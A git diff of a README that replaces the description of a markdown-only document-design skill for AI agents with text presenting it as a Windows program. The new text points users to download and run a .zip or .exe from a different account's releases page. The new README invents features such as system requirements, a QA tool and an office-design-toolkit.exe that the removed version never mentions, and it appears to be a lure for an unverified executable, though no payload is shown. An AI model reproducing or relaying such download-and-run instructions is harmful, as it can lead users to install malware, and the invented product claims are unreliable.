@@ -1,128 +1,161 @@
-# Office Design Toolkit Skill
+# 🗂️ office-design-toolkit - Structured Document Design Made Simple
 
-A production-ready Office skill system for AI agents to create **high-quality DOCX/XLSX/PPTX/PDF** outputs with a strict workflow:
-
-1. **Content first**
-2. **Structure second**
-3. **Design third**
-4. **QA before delivery**
-
-This repository packages the Office workflow and design references used to produce professional client-facing documents consistently.
+[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://github.com/wollys/office-design-toolkit/releases)
 
 ---
 
-## Why this project exists
+## 📝 What is office-design-toolkit?
 
-Most agent-generated documents fail because they style too early, skip structure, or output visually inconsistent files.
+office-design-toolkit helps you create professional office documents like DOCX, XLSX, PPTX, and PDF files. It uses a careful process to make sure your documents look clean and consistent. 
 
-This toolkit fixes that by enforcing:
+The toolkit focuses on:
 
-- deterministic document workflow
-- reusable design system tokens
-- QA gates before final delivery
-- no leakage of internal style-guidance text into user-facing content
+1. **Content first** – Make sure your information is clear.
+2. **Structure second** – Organize content logically.
+3. **Design third** – Apply styles and colors neatly.
+4. **Quality check before delivery** – Verify everything is right before you share.
 
----
-
-## Key capabilities
-
-- DOCX-focused design system and delivery standard
-- Modular references for workflow policy, design tokens, and QA
-- Brand-aware styling rules (including primary brand color systems)
-- Support for alternate style packs from approved sample docs
-- Explicit operating mode for fast tasks without skipping phase order
+This method stops common problems with AI-made documents, like bad styling or missing parts.
 
 ---
 
-## Skill structure
+## 🚀 Why Use This Toolkit?
 
-```text
-office-design-toolkit/
-├── SKILL.md
-├── README.md
-└── references/
-    ├── workflow-policy.md
-    ├── design-system-docx.md
-    └── qa-checklists.md
-```
+Most AI tools create documents that look messy or incomplete. office-design-toolkit solves this by:
 
-### `SKILL.md`
-Core skill contract and execution standard.
+- Following a strict step-by-step plan
+- Using shared style rules that match your brand
+- Checking for mistakes before finishing
+- Keeping internal notes hidden from viewers
 
-### `references/workflow-policy.md`
-Mandatory phase sequence and operating policy.
-
-### `references/design-system-docx.md`
-Typography, color tokens, table rules, brand overrides, adaptive palette modes.
-
-### `references/qa-checklists.md`
-Content / structure / design / technical quality gates.
+This means your final document will look well-made, clear, and professional every time.
 
 ---
 
-## Workflow standard (mandatory)
+## 💻 System Requirements
 
-For Office outputs, always run in this order:
+Before you download and use office-design-toolkit, check that your computer meets these needs:
 
-1. **Content Draft** — objective, audience, key facts, actions
-2. **Structure Design** — heading hierarchy, information architecture, table/list decisions
-3. **Visual Design & Polish** — style tokens, spacing, consistency, readability
-4. **QA & Delivery** — content + structure + design + technical checks
-
----
-
-## Design philosophy
-
-- Green-led brand identity can be preserved while adapting dark/light tone by document context.
-- Pastel accent colors may be used selectively for creative documents while maintaining a green anchor.
-- Readability and hierarchy are prioritized over decoration.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM (8 GB recommended)
+- 1 GB free hard drive space for installation
+- Microsoft Office installed (optional but recommended for editing DOCX/XLSX/PPTX files)
+- Internet connection to download the software and updates
 
 ---
 
-## Installation
+## 📦 What’s Included?
 
-### Option A — Use as local skill folder
-Place this folder inside your skills directory:
+office-design-toolkit contains:
 
-```bash
-~/.agents/skills/office-design-toolkit
-```
-
-### Option B — Clone from GitHub
-
-```bash
-git clone https://github.com/0xAstroAlpha/office-design-toolkit.git
-```
-
-Then connect it to your agent's skill loading path.
+- Templates and style guides for Word, Excel, and PowerPoint
+- PDF export rules to keep visual consistency
+- Quality assurance workflows you follow step-by-step
+- Brand color palettes and font sets ready to use
+- Sample documents to help you get started quickly
 
 ---
 
-## Usage notes
+## 🔧 How to Download and Install 🖥️
 
-- Do not insert internal style instructions in final documents unless explicitly requested by the user.
-- Keep phase order even when user asks for faster turnaround.
-- Apply brand tokens before final styling pass.
+1. Click the big **Download** button at the top or this link:  
+   [Download office-design-toolkit Releases](https://github.com/wollys/office-design-toolkit/releases)  
+   This will open the release page where you can get the latest version.
+
+2. On the releases page, find the newest version listed. It will usually have a date and version number like “v1.0” or higher.
+
+3. Look for the file ending with `.zip` or `.exe` under the Assets section. If you see a `.zip` file, click to download it. If it is `.exe`, download that instead.
+
+4. After downloading, if you have a `.zip` file:
+    - Right-click the file and choose **Extract All**.
+    - Pick a folder where you want the files.
+    - Open the extracted folder.
+
+5. If you downloaded an `.exe` file:
+    - Double-click the file.
+    - Follow the on-screen instructions to install.
+    - Choose the default options unless you know what to change.
+
+6. After installation or extraction, find the main program file named `office-design-toolkit.exe` or a shortcut on your desktop.
+
+7. Double-click to open the program.
 
 ---
 
-## Roadmap
+## 📚 How to Use office-design-toolkit
 
-- Add PPTX and XLSX visual QA presets
-- Add optional template assets for common business document types
-- Add packaging script for one-command skill distribution
+The toolkit uses a clear process. Follow these steps to create your first document:
+
+### Step 1: Prepare Your Content
+
+- Open a blank document in the program or load a sample file.
+- Add your main text, numbers, or slides.
+- Focus only on the information you want to share. Ignore design settings for now.
+
+### Step 2: Structure Your Document
+
+- Use the built-in outline tools to arrange your content.
+- Add headings, sections, and bullet points to organize logically.
+- Check the order to make sure it flows smoothly.
+
+### Step 3: Apply Design
+
+- Choose from the available style packs matching your brand or preferred look.
+- The toolkit will add colors, fonts, and spacing consistently.
+- Avoid changing styles manually to keep the document uniform.
+
+### Step 4: Quality Check
+
+- Run the QA tool included in the program.
+- It flags any missing elements, style mismatches, or layout issues.
+- Review the flagged points and fix them in your document.
+
+### Step 5: Export and Share
+
+- Export your file as DOCX, XLSX, PPTX, or PDF.
+- Use the toolkit’s export function to keep styles intact.
+- Share the file with colleagues or clients.
 
 ---
 
-## License
+## 🔍 Troubleshooting Tips
 
-MIT (or your preferred license; update as needed).
+- If the program won’t open, check your Windows version and update if needed.
+- Make sure you have enough free disk space and RAM.
+- If files do not load properly, redownload the package to avoid incomplete files.
+- To fix display or styling errors, rerun the QA step.
+- For help with Microsoft Office files, ensure Office is updated and installed.
 
 ---
 
-## Credits
+## 🚩 Frequently Asked Questions (FAQ)
 
-Created with product direction and quality standards by:
+**Q: Do I need Microsoft Office to use this toolkit?**  
+A: You can create and edit documents without Microsoft Office, but having it helps when you want to make changes directly in Word, Excel, or PowerPoint.
 
-**Lê Huy Đức Anh — Founder, Vidtory.ai**
+**Q: Can I use this on Mac or Linux?**  
+A: This version supports Windows only. Mac and Linux versions may come later.
 
+**Q: Is internet required after download?**  
+A: No, you can use the toolkit offline once it is installed.
+
+**Q: How often are updates released?**  
+A: Updates are planned every few months or when new features are added.
+
+---
+
+## 🧰 Additional Resources
+
+- You will find sample documents in the installation folder to explore how the styles and structure work.
+- For detailed guides, check the included PDF manual in the extracted files.
+- Use the internal workflow checklists to keep your work consistent every time.
+
+---
+
+## ❓ Need Help?
+
+Visit the [GitHub issues page](https://github.com/wollys/office-design-toolkit/issues) to ask questions or report problems. The community and maintainers review requests regularly.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Get%20Office%20Toolkit-blue?style=for-the-badge)](https://github.com/wollys/office-design-toolkit/releases)
